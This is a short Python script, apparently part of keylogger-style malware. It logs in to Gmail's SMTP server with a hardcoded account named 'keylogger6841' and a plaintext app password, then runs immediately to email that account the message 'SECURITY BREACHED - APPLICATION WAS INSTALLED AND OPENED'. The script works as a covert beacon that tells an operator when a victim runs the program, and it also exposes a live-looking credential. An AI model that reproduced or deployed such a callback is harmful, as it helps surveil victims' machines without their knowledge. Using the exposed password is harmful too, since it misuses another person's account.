import smtplib
EMAIL_ADDRESS_LOGIN = "keylogger6841@gmail.com"
EMAIL_ADDRESS_SENDTO = "keylogger6841@gmail.com"
EMAIL_PASSWORD = "ounlbnfqldzcnkxb"
def sendmail(emailsendfrom, emailsendto, password):
    server = smtplib.SMTP(host="smtp.gmail.com", port=587)
    # connect to the SMTP server as TLS mode ( for security )
    server.starttls()
    # login to the email account
    server.login(emailsendfrom, password)
    # send the actual message
    server.sendmail(emailsendfrom, emailsendto, "SECURITY BREACHED - APPLICATION WAS INSTALLED AND OPENED")
    # terminates the session
    server.quit()

sendmail(EMAIL_ADDRESS_LOGIN, EMAIL_ADDRESS_SENDTO, EMAIL_PASSWORD)